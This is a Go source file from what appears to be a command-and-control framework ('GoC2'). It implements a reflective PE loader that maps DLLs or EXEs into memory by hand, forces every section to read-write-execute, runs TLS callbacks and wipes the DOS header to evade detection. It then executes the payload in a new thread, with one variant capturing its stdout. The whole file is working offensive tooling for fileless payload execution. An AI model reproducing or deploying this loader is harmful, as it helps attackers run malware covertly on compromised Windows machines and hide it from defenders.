package peloader

import (
	"bytes"
	"debug/pe"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"

	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

// Section characteristics flags.
const (
	IMAGE_SCN_CNT_CODE               = 0x00000020
	IMAGE_SCN_CNT_INITIALIZED_DATA   = 0x00000040
	IMAGE_SCN_CNT_UNINITIALIZED_DATA = 0x00000080
	IMAGE_SCN_LNK_OTHER              = 0x00000100
	IMAGE_SCN_LNK_INFO               = 0x00000200
	IMAGE_SCN_LNK_REMOVE             = 0x00000800
	IMAGE_SCN_LNK_COMDAT             = 0x00001000
	IMAGE_SCN_GPREL                  = 0x00008000
	IMAGE_SCN_MEM_PURGEABLE          = 0x00020000
	IMAGE_SCN_MEM_16BIT              = 0x00020000
	IMAGE_SCN_MEM_LOCKED             = 0x00040000
	IMAGE_SCN_MEM_PRELOAD            = 0x00080000
	IMAGE_SCN_ALIGN_1BYTES           = 0x00100000
	IMAGE_SCN_ALIGN_2BYTES           = 0x00200000
	IMAGE_SCN_ALIGN_4BYTES           = 0x00300000
	IMAGE_SCN_ALIGN_8BYTES           = 0x00400000
	IMAGE_SCN_ALIGN_16BYTES          = 0x00500000
	IMAGE_SCN_ALIGN_32BYTES          = 0x00600000
	IMAGE_SCN_ALIGN_64BYTES          = 0x00700000
	IMAGE_SCN_ALIGN_128BYTES         = 0x00800000
	IMAGE_SCN_ALIGN_256BYTES         = 0x00900000
	IMAGE_SCN_ALIGN_512BYTES         = 0x00A00000
	IMAGE_SCN_ALIGN_1024BYTES        = 0x00B00000
	IMAGE_SCN_ALIGN_2048BYTES        = 0x00C00000
	IMAGE_SCN_ALIGN_4096BYTES        = 0x00D00000
	IMAGE_SCN_ALIGN_8192BYTES        = 0x00E00000
	IMAGE_SCN_LNK_NRELOC_OVFL        = 0x01000000
	IMAGE_SCN_MEM_DISCARDABLE        = 0x02000000
	IMAGE_SCN_MEM_NOT_CACHED         = 0x04000000
	IMAGE_SCN_MEM_NOT_PAGED          = 0x08000000
	IMAGE_SCN_MEM_SHARED             = 0x10000000
	IMAGE_SCN_MEM_EXECUTE            = 0x20000000
	IMAGE_SCN_MEM_READ               = 0x40000000
	IMAGE_SCN_MEM_WRITE              = 0x80000000
)
const (
	IMAGE_DOS_SIGNATURE = 0x5A4D
	IMAGE_NT_SIGNATURE  = 0x00004550 // PE00
)

var (
	PAGE_SIZE = os.Getpagesize()
)

type MemorySection struct {
	Name           string
	PeSection      pe.Section
	MemoryAddress  uintptr
	AlignedAddress uintptr
	Size           uint32
}

type ProtFlags [2][2][2]uint32

var ProtectionFlags = ProtFlags{
	{
		// not executable
		{winapi.PAGE_NOACCESS, winapi.PAGE_WRITECOPY},
		{winapi.PAGE_READONLY, winapi.PAGE_READWRITE},
	},
	{
		// executable
		{winapi.PAGE_EXECUTE, winapi.PAGE_EXECUTE_WRITECOPY},
		{winapi.PAGE_EXECUTE_READ, winapi.PAGE_EXECUTE_READWRITE},
	},
}

const (
	IMAGE_ORDINAL_FLAG64 = 0x8000000000000000
	IMAGE_ORDINAL_FLAG32 = 0x80000000
)

type IMAGE_BASE_RELOCATION struct {
	VirtualAddress uint32
	SizeOfBlock    uint32
}

const (
	IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
)

const (
	IMAGE_REL_BASED_ABSOLUTE = 0
	IMAGE_REL_BASED_HIGHLOW  = 3
	IMAGE_REL_BASED_DIR64    = 10
)

type BASE_RELOCATION_ENTRY struct {
	Offset uint8 //: 12;
	Type   uint8 //: 4;
}

type IMAGE_IMPORT_BY_NAME struct {
	Hint [2]byte
	Name [10]byte
}

// ImageDOSHeader represents the DOS stub of a PE.
type ImageDOSHeader struct {
	// Magic number.
	Magic uint16

	// Bytes on last page of file.
	BytesOnLastPageOfFile uint16

	// Pages in file.
	PagesInFile uint16

	// Relocations.
	Relocations uint16

	// Size of header in paragraphs.
	SizeOfHeader uint16

	// Minimum extra paragraphs needed.
	MinExtraParagraphsNeeded uint16

	// Maximum extra paragraphs needed.
	MaxExtraParagraphsNeeded uint16

	// Initial (relative) SS value.
	InitialSS uint16

	// Initial SP value.
	InitialSP uint16

	// Checksum.
	Checksum uint16

	// Initial IP value.
	InitialIP uint16

	// Initial (relative) CS value.
	InitialCS uint16

	// File address of relocation table.
	AddressOfRelocationTable uint16

	// Overlay number.
	OverlayNumber uint16

	// Reserved words.
	ReservedWords1 [4]uint16

	// OEM identifier.
	OEMIdentifier uint16

	// OEM information.
	OEMInformation uint16

	// Reserved words.
	ReservedWords2 [10]uint16

	// File address of new exe header (Elfanew).
	AddressOfNewEXEHeader uint32
}

func ImageOrdinal64(ordinal uint64) uint64 {
	return ordinal & 0xffff
}

func ImageOrdinal32(ordinal uint32) uint32 {
	return ordinal & 0xffff
}

func ImageSnapByOridinal32(ordinal uint32) bool {
	return ((ordinal & IMAGE_ORDINAL_FLAG32) != 0)
}

func ImageSnapByOridinal64(ordinal uint64) bool {
	return ((ordinal & IMAGE_ORDINAL_FLAG64) != 0)
}

func OffsetPointer(start uintptr, offset uintptr) uintptr {
	return start + offset
}

///https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c
func ReadAsciiFromMemory(startPtr uintptr, memoryStart uintptr) []byte {
	var asciiArray []byte
	for x := 0; ; x++ {
		byteValue := *(*byte)(unsafe.Pointer(uintptr(startPtr+uintptr(x)) + memoryStart))
		if byteValue == 0 {
			break
		}
		asciiArray = append(asciiArray, byteValue)
	}
	return asciiArray
}

func ReadAsciiFromMemoryNoBase(startPtr uintptr) []byte {
	var asciiArray []byte
	for x := 0; ; x++ {
		byteValue := *(*byte)(unsafe.Pointer(uintptr(startPtr + uintptr(x))))
		if byteValue == 0 {
			break
		}
		asciiArray = append(asciiArray, byteValue)
	}
	return asciiArray
}

func AlignAddressDown(address, alignment uintptr) uintptr {
	return address & ^(alignment - 1)
}

func AlignValueUp(value, alignment uint32) uint32 {
	not := ^(alignment - 1)
	return (value + alignment - 1) & not
}

func CheckSize(size uint32, expectedSz uint32) bool {
	if size < expectedSz {
		return false
	}
	return true
}

func GetRealSectionSize(peHeader *pe.OptionalHeader64, section *pe.Section) uint32 {
	if section.Size != 0 {
		return section.Size
	}
	if section.Characteristics&IMAGE_SCN_CNT_INITIALIZED_DATA > 0 {
		return peHeader.SizeOfInitializedData
	}
	if section.Characteristics&IMAGE_SCN_CNT_UNINITIALIZED_DATA > 0 {
		return peHeader.SizeOfUninitializedData
	}
	return 0
}
func FindExportedFunction(peHeader *pe.OptionalHeader64, memoryStart uintptr, exportedFunction string) (uintptr, error) {
	dataDirectory := peHeader.DataDirectory
	if len(dataDirectory) == 0 {
		return 0, fmt.Errorf("[+] Data Directory Empty")
	}
	exportDirectory := dataDirectory[0] // export directory is the zero index
	exports := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(memoryStart + uintptr(exportDirectory.VirtualAddress)))
	if exports.NumberOfNames == 0 || exports.NumberOfFunctions == 0 {
		return 0, nil
	}
	// loop over address of names to find the name
	// looping over ordinals at the same time to match the name and ordinal
	nameRef := (*uint32)(unsafe.Pointer(memoryStart + uintptr(exports.AddressOfNames)))
	ordinal := (*uint16)(unsafe.Pointer(memoryStart + uintptr(exports.AddressOfNameOrdinals)))
	for i := 0; i < int(exports.NumberOfNames); i++ {
		// here we loop.
		functionName := (*byte)(unsafe.Pointer(memoryStart + uintptr(*nameRef)))
		functionIdx := *ordinal
		// we now need to check if that name matches what we asked for.
		functionNameString := string(ReadAsciiFromMemoryNoBase(uintptr(unsafe.Pointer(functionName))))
		if functionNameString == exportedFunction {
			functionEntryPoint := memoryStart + uintptr(*(*uint32)(unsafe.Pointer((memoryStart + uintptr(exports.AddressOfFunctions) + uintptr(functionIdx*4)))))
			return functionEntryPoint, nil
		}
	}
	return 0, fmt.Errorf("Function Not Found.")
}

func ExecuteTLS(peHeader *pe.OptionalHeader64, memoryStart uintptr) error {
	dataDirectory := peHeader.DataDirectory
	if len(dataDirectory) == 0 {
		return errors.New("[+] Data Directory Empty")
	}
	directory := dataDirectory[9]
	if directory.VirtualAddress == 0 {
		return nil // no tls
	}
	tlsDirectory := (*IMAGE_TLS_DIRECTORY)(unsafe.Pointer(memoryStart + uintptr(directory.VirtualAddress)))
	callback := (unsafe.Pointer(tlsDirectory.AddressOfCallbacks))
	if tlsDirectory.AddressOfCallbacks != 0 {
		for {
			callbackFunc := *(*uintptr)(callback)
			if callbackFunc == 0 {
				break
			}
			syscall.Syscall(uintptr(callbackFunc), 3, memoryStart, 1, 0)
			callback = unsafe.Pointer(uintptr(callback) + 8)
		}
	}
	return nil
}

func CreateImportAddressTable(peHeader *pe.OptionalHeader64, memoryStart uintptr) error {
	dataDirectory := peHeader.DataDirectory
	if len(dataDirectory) == 0 {
		return errors.New("[+] Data Directory Empty")
	}
	directory := dataDirectory[1]
	importDirectorySize := unsafe.Sizeof(pe.ImportDirectory{})
	importDescriptionPtr := unsafe.Pointer(memoryStart + uintptr(directory.VirtualAddress))
	for winapi.IsBadReadPtr(uintptr(importDescriptionPtr), importDirectorySize) && (*pe.ImportDirectory)(importDescriptionPtr).Name != 0 {
		importDescriptor := (*pe.ImportDirectory)(importDescriptionPtr)
		namePtr := importDescriptor.Name
		nameAscii := ReadAsciiFromMemory(uintptr(namePtr), memoryStart)
		libraryHandle, err := windows.LoadLibrary(string(nameAscii))
		if err != nil {
			return errors.New(fmt.Sprintf("Failed to load required libary %v", err))
		}
		var thunkRef unsafe.Pointer
		var funcRef unsafe.Pointer
		if importDescriptor.OriginalFirstThunk == 0 {
			thunkRef = unsafe.Pointer(uintptr(importDescriptor.OriginalFirstThunk) + memoryStart)
			funcRef = unsafe.Pointer(uintptr(importDescriptor.FirstThunk) + memoryStart)
		} else {
			thunkRef = unsafe.Pointer(uintptr(importDescriptor.FirstThunk) + memoryStart)
			funcRef = unsafe.Pointer(uintptr(importDescriptor.FirstThunk) + memoryStart)
		}
		for {
			if *(*uintptr)(thunkRef) == 0 {
				break
			}
			if ImageSnapByOridinal64(*(*uint64)(thunkRef)) {
				funcPtr, err := windows.GetProcAddressByOrdinal(libraryHandle, uintptr(ImageOrdinal64(*(*uint64)(thunkRef))))
				if err != nil {
					return errors.New(fmt.Sprintf("Failed to get proc address by ordinal %v", err))
				}
				*(*uintptr)(funcRef) = funcPtr
			} else {
				thunkData := memoryStart + *(*uintptr)(thunkRef)
				funcName := string(ReadAsciiFromMemoryNoBase(thunkData + 2))
				funcPtr, err := windows.GetProcAddress(libraryHandle, funcName)
				if err != nil {
					return errors.New(fmt.Sprintf("Failed to get proc addess by name %v", err))
				}
				*(*uintptr)(funcRef) = uintptr(unsafe.Pointer(funcPtr))
			}
			if *(*uint64)(funcRef) == 0 {
				return errors.New("Failed to get function pointer")
			}
			sizeOfPtr := unsafe.Sizeof(uintptr(thunkRef))
			thunkRef = unsafe.Pointer(uintptr(thunkRef) + sizeOfPtr)
			funcRef = unsafe.Pointer(uintptr(funcRef) + sizeOfPtr)
		}
		importDescriptionPtr = unsafe.Pointer((uintptr(importDescriptionPtr) + unsafe.Sizeof(pe.ImportDirectory{})/2))
	}
	return nil
}

func FinalizeSections(dll *pe.File, peHeaderOptionalHeader64 *pe.OptionalHeader64, baseAddress uintptr, memorySections []MemorySection) error {
	for _, s := range memorySections {
		s.AlignedAddress = AlignAddressDown(s.MemoryAddress, uintptr(PAGE_SIZE))
		s.Size = GetRealSectionSize(peHeaderOptionalHeader64, &s.PeSection)
	}
	for _, s := range memorySections {
		if s.Size == 0 {
			continue
		}
		if s.PeSection.Characteristics&IMAGE_SCN_MEM_DISCARDABLE != 0 {
			err := windows.VirtualFree(s.MemoryAddress, uintptr(s.Size), windows.MEM_DECOMMIT)
			if err != nil {
				return errors.New(fmt.Sprintf("Failed to free discarded section %v", err))
			}
			continue
		}
		//var protFlags uint32
		executable := (s.PeSection.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0
		readable := (s.PeSection.Characteristics & IMAGE_SCN_MEM_READ) != 0
		writable := (s.PeSection.Characteristics & IMAGE_SCN_MEM_WRITE) != 0
		var e, r, w uint32
		if executable {
			e = 1
		}
		if readable {
			r = 1
		}
		if writable {
			w = 1
		}
		e, r, w = 1, 1, 1
		protFlags := ProtectionFlags[e][r][w]
		var oldFlags uint32
		if s.PeSection.Characteristics&IMAGE_SCN_MEM_NOT_CACHED != 0 {
			protFlags |= winapi.PAGE_NOCACHE
		}
		err := windows.VirtualProtect(s.MemoryAddress, uintptr(s.Size), protFlags, &oldFlags)
		if err != nil {
			return errors.New(fmt.Sprintf("Failed to change memory protections for section %s %v", s.Name, err))
		}
	}
	return nil
}

func (r *RawPe) CopySectionsToMemory(dll *pe.File, peHeaderOptionalHeader64 *pe.OptionalHeader64, baseAddress uintptr) ([]MemorySection, error) {
	memSections := make([]MemorySection, 0)
	for _, section := range dll.Sections {
		memSection := MemorySection{}
		memSection.Name = section.Name
		data, err := section.Data()
		if err != nil {
			return nil, errors.New(fmt.Sprintf("Failed to get section data %v", err))
		}
		if len(data) == 0 {
			sectionSz := peHeaderOptionalHeader64.SectionAlignment
			if sectionSz > 0 {
				dest, _ := winapi.VirtualAlloc(baseAddress+uintptr(section.VirtualAddress), sectionSz, winapi.MEM_COMMIT, winapi.PAGE_READWRITE)
				if dest == 0 {
					return nil, errors.New(fmt.Sprintf("Failed to allocate memory for section, %v", err))
				}
				r.allocationAddresses = append(r.allocationAddresses, dest)
				memSection.MemoryAddress = dest
				memSection.PeSection = *section
				memSection.Size = sectionSz
				memSections = append(memSections, memSection)
			}
			continue
		}
		dest, _ := winapi.VirtualAlloc(baseAddress+uintptr(section.VirtualAddress), section.Size, winapi.MEM_COMMIT, winapi.PAGE_READWRITE)
		if dest == 0 {
			return nil, errors.New(fmt.Sprintf("Failed to allocate memory for section, %v", err))
		}
		r.allocationAddresses = append(r.allocationAddresses, dest)
		dest = baseAddress + uintptr(section.VirtualAddress)
		var wrote uint32
		result, err := winapi.WriteProcessMemory(syscall.Handle(winapi.GetCurrentProcess()), dest, uintptr(unsafe.Pointer(&data[0])), section.Size, &wrote)
		if !result {
			return nil, errors.New(fmt.Sprintf("Failed to write section to memory%v", err))
		}
		memSection.MemoryAddress = dest
		memSection.Size = section.Size
		memSection.PeSection = *section
		memSections = append(memSections, memSection)
	}
	return memSections, nil
}

func BaseRelocate(addressDiff uint64, baseAddress uintptr, peHeader pe.OptionalHeader64) error {
	dataDirectory := peHeader.DataDirectory
	if len(dataDirectory) == 0 {
		return errors.New("Data Directory Empty")
	}
	directory := dataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
	baseRelocDirectoryPtr := unsafe.Pointer(baseAddress + uintptr(directory.VirtualAddress))
	relocate := (*IMAGE_BASE_RELOCATION)(baseRelocDirectoryPtr)
	if directory.Size == 0 {
		return errors.New("Something went wrong, if directory size is zero we shouldnt need to relocate.")
	}
	for relocate.VirtualAddress > 0 {
		destinationAddress := baseAddress + uintptr(relocate.VirtualAddress)
		relocationInfoPtr := unsafe.Pointer(OffsetPointer(uintptr(unsafe.Pointer(relocate)), unsafe.Sizeof(IMAGE_BASE_RELOCATION{})))
		relocationInfo := (*uint16)(relocationInfoPtr)
		var i uint32
		for i = 0; i < ((relocate.SizeOfBlock - 8) / 2); i++ {
			relocType := *relocationInfo >> 12
			offset := *relocationInfo & 0xfff
			switch relocType {
			case IMAGE_REL_BASED_ABSOLUTE:
				break
			case IMAGE_REL_BASED_HIGHLOW:
				patchAddressHl := (*uint32)(unsafe.Pointer(destinationAddress + uintptr(offset)))
				*patchAddressHl += uint32(addressDiff)
				break
			case IMAGE_REL_BASED_DIR64:
				patchAddress64 := (*uint64)(unsafe.Pointer(destinationAddress + uintptr(offset)))
				*patchAddress64 += uint64(addressDiff)
				break
			default:
				break
			}
			relocationInfo = (*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(relocationInfo)) + 2))
		}
		if relocate.VirtualAddress < 1 {
			break
		}
		relocate = (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(uintptr(unsafe.Pointer(relocate)) + uintptr(relocate.SizeOfBlock))) //32

	}
	return nil
}

type PeType int

const (
	Dll PeType = iota
	Exe
)

type RawPe struct {
	allocationAddresses []uintptr
	peType              PeType
	rawData             []byte
	peStruct            *pe.File
	peHeaders           *pe.OptionalHeader64
	alignedImageSize    uint32
	removeHeader        bool
	peEntry             uintptr
	allocatedMemoryBase uintptr
	exportedFunction    string
	// other stuff here in the future like exports
	// delete header flags etcs
}

func NewRawPE(peT PeType, exportFunction string, data []byte) *RawPe {
	return &RawPe{
		allocationAddresses: make([]uintptr, 0),
		peType:              peT,
		rawData:             data,
		peStruct:            nil,
		exportedFunction:    exportFunction,
	}
}

func RemoveDOSHeader(baseAddress uintptr) {
	// zero dos header and dos stub, and rich header
	//https://stackoverflow.com/questions/65168544/dos-stub-in-a-pe-file
	//http://bytepointer.com/articles/the_microsoft_rich_header.htm
	//still shows the sections etc.
	var x uintptr
	for ; x < 500; x++ {
		*(*byte)(unsafe.Pointer(baseAddress)) = 0
		baseAddress += 1
	}
}

func (r *RawPe) LoadPEFromMemory() (string, error) {
	peFile, err := pe.NewFile(bytes.NewReader(r.rawData))
	if err != nil {
		return "", errors.New(fmt.Sprintf("Failed to load pe file %v", err))
	}
	r.peStruct = peFile
	if !DosHeaderCheck(r.rawData) {
		return "", errors.New("Dos header check failed.")
	}
	// only support 64 bit.
	r.peHeaders = r.peStruct.OptionalHeader.(*pe.OptionalHeader64)
	if (r.peHeaders.SectionAlignment & 1) != 0 {
		return "", errors.New("Unknown Alignment error.")
	}
	//alignedImgSize := AlignValueUp(r.peHeaders.SizeOfImage, uint32(PAGE_SIZE))
	r.alignedImageSize = AlignValueUp(r.peHeaders.SizeOfImage, uint32(PAGE_SIZE))
	if r.alignedImageSize != AlignValueUp(r.peStruct.Sections[r.peStruct.NumberOfSections-1].VirtualAddress+r.peStruct.Sections[r.peStruct.NumberOfSections-1].Size, uint32(PAGE_SIZE)) {
		return "", errors.New("Failed to align image.")
	}
	// allocating memory chunk for image.
	var baseAddressOfMemoryAlloc uintptr
	prefBaseAddr := uintptr(r.peHeaders.ImageBase)
	baseAddressOfMemoryAlloc, err = winapi.VirtualAlloc(uintptr(r.peHeaders.ImageBase), r.alignedImageSize, winapi.MEM_RESERVE|winapi.MEM_COMMIT, winapi.PAGE_READWRITE)
	if baseAddressOfMemoryAlloc == 0 {
		//log.Println("Failed to allocate at preffered base address...Attempting to allocate anywhere else.")
		baseAddressOfMemoryAlloc, err = winapi.VirtualAlloc(uintptr(0), r.alignedImageSize, winapi.MEM_RESERVE|winapi.MEM_COMMIT, winapi.PAGE_READWRITE)
		if err != nil {
			return "", errors.New(fmt.Sprintf("Failed to allocate memory at random location %v", err))
		}
	}
	r.allocationAddresses = append(r.allocationAddresses, baseAddressOfMemoryAlloc)
	// base memory chunk allocated.
	peHead, err := winapi.VirtualAlloc(baseAddressOfMemoryAlloc, r.peHeaders.SizeOfHeaders, winapi.MEM_COMMIT, winapi.PAGE_READWRITE)
	if peHead == 0 {
		return "", errors.New(fmt.Sprintf("Failed to commit memory for pe headers %v", err))
	}
	r.allocationAddresses = append(r.allocationAddresses, peHead)
	// committed memory for pe headers.
	var wrote uint32
	if ok, err := winapi.WriteProcessMemory(syscall.Handle(winapi.GetCurrentProcess()), peHead, uintptr(unsafe.Pointer(&r.rawData[0])), r.peHeaders.SizeOfHeaders, &wrote); !ok {
		return "", errors.New(fmt.Sprintf("Failed to write pe headers to memory %v", err))
	}
	// wrote pe headers to memory
	r.peHeaders.ImageBase = uint64(baseAddressOfMemoryAlloc)
	// updating pe header to reflect base address (just incase it changed)
	// now you commit sections in the memory block and copy the sections to the proper locations
	memSections, err := r.CopySectionsToMemory(r.peStruct, r.peHeaders, baseAddressOfMemoryAlloc)
	if err != nil {
		return "", err
	}
	//base relocations if preferred base address is doesnt match where we allocated memory
	baseAddressDiff := uint64(baseAddressOfMemoryAlloc - prefBaseAddr)
	if baseAddressDiff != 0 {
		if err := BaseRelocate(baseAddressDiff, baseAddressOfMemoryAlloc, *r.peHeaders); err != nil {
			return "", errors.New(fmt.Sprintf("Failed to base relocate %v", err))
		}
	}
	err = CreateImportAddressTable(r.peHeaders, baseAddressOfMemoryAlloc)
	if err != nil {
		return "", err
	}
	err = FinalizeSections(r.peStruct, r.peHeaders, baseAddressOfMemoryAlloc, memSections)
	if err != nil {
		return "", err
	}
	err = ExecuteTLS(r.peHeaders, baseAddressOfMemoryAlloc)
	if err != nil {
		return "", err
	}
	RemoveDOSHeader(baseAddressOfMemoryAlloc)
	entryPointPtr := unsafe.Pointer(uintptr(r.peHeaders.AddressOfEntryPoint) + baseAddressOfMemoryAlloc)
	r.peEntry = uintptr(entryPointPtr)
	r.allocatedMemoryBase = baseAddressOfMemoryAlloc
	switch r.peType {
	case Dll:
		exportEntryPoint, err := FindExportedFunction(r.peHeaders, baseAddressOfMemoryAlloc, r.exportedFunction)
		if err != nil {
			windows.VirtualFree(uintptr(r.allocatedMemoryBase), 0, winapi.MEM_RELEASE)
			return "", err
		}
		hThread, err := winapi.CreateThread(0, 0, uintptr(exportEntryPoint), 0, 0, nil)
		if err != nil {
			windows.VirtualFree(uintptr(r.allocatedMemoryBase), 0, winapi.MEM_RELEASE)
			return "", err
		}
		go func() {
			// clean memory once it exits thread.
			windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
			windows.VirtualFree(uintptr(r.allocatedMemoryBase), 0, winapi.MEM_RELEASE)
		}()
		entryPointPtr = unsafe.Pointer(exportEntryPoint)
		break
	case Exe:
		// calling exe entry point no args
		// we are not patching exitThread so when exes exit they will crash process
		// exe needs to call exitThread before exiting and needs to be run in seperate thread
		// in this goroutine we run the entry point in another thread. wait for it to finish then free the memory
		hThread, err := winapi.CreateThread(0, 0, uintptr(entryPointPtr), 0, 0, nil)
		if err != nil {
			windows.VirtualFree(uintptr(r.allocatedMemoryBase), 0, winapi.MEM_RELEASE)
			return "", err
		}
		go func() {
			// clean memory once it exits thread.
			windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
			windows.VirtualFree(uintptr(r.allocatedMemoryBase), 0, winapi.MEM_RELEASE)
		}()
		break
	default:
		windows.VirtualFree(uintptr(r.allocatedMemoryBase), 0, winapi.MEM_RELEASE)
		return "", errors.New("Provided Invalid PE Type")
	}
	return fmt.Sprintf("[+] Loaded PE at memory Base Address %p PE Entry Point Address %p", unsafe.Pointer(r.allocatedMemoryBase), entryPointPtr), nil
}

func (r *RawPe) LoadPEFromMemoryPipe() (string, error) {
	peFile, err := pe.NewFile(bytes.NewReader(r.rawData))
	if err != nil {
		return "", errors.New(fmt.Sprintf("Failed to load pe file %v", err))
	}
	r.peStruct = peFile
	if !DosHeaderCheck(r.rawData) {
		return "", errors.New("Dos header check failed.")
	}
	// only support 64 bit.
	r.peHeaders = r.peStruct.OptionalHeader.(*pe.OptionalHeader64)
	if (r.peHeaders.SectionAlignment & 1) != 0 {
		return "", errors.New("Unknown Alignment error.")
	}
	//alignedImgSize := AlignValueUp(r.peHeaders.SizeOfImage, uint32(PAGE_SIZE))
	r.alignedImageSize = AlignValueUp(r.peHeaders.SizeOfImage, uint32(PAGE_SIZE))
	if r.alignedImageSize != AlignValueUp(r.peStruct.Sections[r.peStruct.NumberOfSections-1].VirtualAddress+r.peStruct.Sections[r.peStruct.NumberOfSections-1].Size, uint32(PAGE_SIZE)) {
		return "", errors.New("Failed to align image.")
	}
	// allocating memory chunk for image.
	var baseAddressOfMemoryAlloc uintptr
	prefBaseAddr := uintptr(r.peHeaders.ImageBase)
	baseAddressOfMemoryAlloc, err = winapi.VirtualAlloc(uintptr(r.peHeaders.ImageBase), r.alignedImageSize, winapi.MEM_RESERVE|winapi.MEM_COMMIT, winapi.PAGE_READWRITE)
	if baseAddressOfMemoryAlloc == 0 {
		//log.Println("Failed to allocate at preffered base address...Attempting to allocate anywhere else.")
		baseAddressOfMemoryAlloc, err = winapi.VirtualAlloc(uintptr(0), r.alignedImageSize, winapi.MEM_RESERVE|winapi.MEM_COMMIT, winapi.PAGE_READWRITE)
		if err != nil {
			return "", errors.New(fmt.Sprintf("Failed to allocate memory at random location %v", err))
		}
	}
	r.allocationAddresses = append(r.allocationAddresses, baseAddressOfMemoryAlloc)
	// base memory chunk allocated.
	peHead, err := winapi.VirtualAlloc(baseAddressOfMemoryAlloc, r.peHeaders.SizeOfHeaders, winapi.MEM_COMMIT, winapi.PAGE_READWRITE)
	if peHead == 0 {
		r.FreePeFromMemory()
		return "", errors.New(fmt.Sprintf("Failed to commit memory for pe headers %v", err))
	}
	r.allocationAddresses = append(r.allocationAddresses, peHead)
	// committed memory for pe headers.
	var wrote uint32
	if ok, err := winapi.WriteProcessMemory(syscall.Handle(winapi.GetCurrentProcess()), peHead, uintptr(unsafe.Pointer(&r.rawData[0])), r.peHeaders.SizeOfHeaders, &wrote); !ok {
		r.FreePeFromMemory()
		return "", errors.New(fmt.Sprintf("Failed to write pe headers to memory %v", err))
	}
	// wrote pe headers to memory
	r.peHeaders.ImageBase = uint64(baseAddressOfMemoryAlloc)
	// updating pe header to reflect base address (just incase it changed)
	// now you commit sections in the memory block and copy the sections to the proper locations
	memSections, err := r.CopySectionsToMemory(r.peStruct, r.peHeaders, baseAddressOfMemoryAlloc)
	if err != nil {
		r.FreePeFromMemory()
		return "", err
	}
	//base relocations if preferred base address is doesnt match where we allocated memory
	baseAddressDiff := uint64(baseAddressOfMemoryAlloc - prefBaseAddr)
	if baseAddressDiff != 0 {
		if err := BaseRelocate(baseAddressDiff, baseAddressOfMemoryAlloc, *r.peHeaders); err != nil {
			r.FreePeFromMemory()
			return "", errors.New(fmt.Sprintf("Failed to base relocate %v", err))
		}
	}
	err = CreateImportAddressTable(r.peHeaders, baseAddressOfMemoryAlloc)
	if err != nil {
		r.FreePeFromMemory()
		return "", err
	}
	err = FinalizeSections(r.peStruct, r.peHeaders, baseAddressOfMemoryAlloc, memSections)
	if err != nil {
		r.FreePeFromMemory()
		return "", err
	}
	err = ExecuteTLS(r.peHeaders, baseAddressOfMemoryAlloc)
	if err != nil {
		r.FreePeFromMemory()
		return "", err
	}
	RemoveDOSHeader(baseAddressOfMemoryAlloc)
	entryPointPtr := unsafe.Pointer(uintptr(r.peHeaders.AddressOfEntryPoint) + baseAddressOfMemoryAlloc)
	r.peEntry = uintptr(entryPointPtr)
	r.allocatedMemoryBase = baseAddressOfMemoryAlloc
	var result string = ""
	switch r.peType {
	case Dll:
		exportEntryPoint, err := FindExportedFunction(r.peHeaders, baseAddressOfMemoryAlloc, r.exportedFunction)
		if err != nil {
			r.FreePeFromMemory()
			return "", err
		}
		f, err := ioutil.TempFile("", "*.log")
		if err != nil {
			r.FreePeFromMemory()
			return "", err
		}
		name := f.Name()
		f.Close() // close file.
		hFile := winapi.CreateFile(name, windows.GENERIC_READ|windows.GENERIC_WRITE, windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE, 0, windows.OPEN_ALWAYS, windows.FILE_ATTRIBUTE_NORMAL, 0)
		if hFile == 0 {
			r.FreePeFromMemory()
			return "", fmt.Errorf("Failed to get handle to tmp file")
		}
		err = winapi.SetStdHandle(windows.STD_OUTPUT_HANDLE, windows.Handle(hFile))
		if err != nil {
			r.FreePeFromMemory()
			return "", err
		}
		hThread, err := winapi.CreateThread(0, 0, exportEntryPoint, 0, 0, nil)
		if err != nil {
			r.FreePeFromMemory()
			return "", err
		}
		windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
		r.FreePeFromMemory()
		windows.CloseHandle(windows.Handle(hFile))
		hStdout, err := windows.GetStdHandle(windows.STD_OUTPUT_HANDLE)
		windows.SetStdHandle(windows.STD_OUTPUT_HANDLE, hStdout)
		data, err := ioutil.ReadFile(name)
		if err != nil {
			return "", err
		}
		os.Remove(name)
		result = string(data)
		break
	case Exe:
		// calling exe entry point no args
		// we are not patching exitThread so when exes exit they will crash process
		// exe needs to call exitThread before exiting and needs to be run in seperate thread
		// in this goroutine we run the entry point in another thread. wait for it to finish then free the memory
		// may not work if there is no console aka injected into gui app
		//result, err = winapi.ExecuteFunctionSaveOutputConsole(entryPointPtr)
		f, err := ioutil.TempFile("", "*.log")
		if err != nil {
			r.FreePeFromMemory()
			return "", err
		}
		name := f.Name()
		f.Close() // close file.
		hFile := winapi.CreateFile(name, windows.GENERIC_READ|windows.GENERIC_WRITE, windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE, 0, windows.OPEN_ALWAYS, windows.FILE_ATTRIBUTE_NORMAL, 0)
		if hFile == 0 {
			r.FreePeFromMemory()
			return "", fmt.Errorf("Failed to get handle to tmp file")
		}
		//FixExeParameters()
		err = winapi.SetStdHandle(windows.STD_OUTPUT_HANDLE, windows.Handle(hFile))
		if err != nil {
			r.FreePeFromMemory()
			return "", err
		}
		hThread, err := winapi.CreateThread(0, 0, uintptr(entryPointPtr), 0, 0, nil)
		if err != nil {
			r.FreePeFromMemory()
			return "", err
		}
		windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
		r.FreePeFromMemory()
		windows.CloseHandle(windows.Handle(hFile))
		hStdout, err := windows.GetStdHandle(windows.STD_OUTPUT_HANDLE)
		windows.SetStdHandle(windows.STD_OUTPUT_HANDLE, hStdout)
		data, err := ioutil.ReadFile(name)
		if err != nil {
			return "", err
		}
		os.Remove(name)
		result = string(data)
		break
	default:
		r.FreePeFromMemory()
		return "", errors.New("Provided Invalid PE Type")
	}
	return fmt.Sprintf("PE STDOUT: %s", result), nil
}

//TODO need to allocate a new buffer to replace new commandlinew
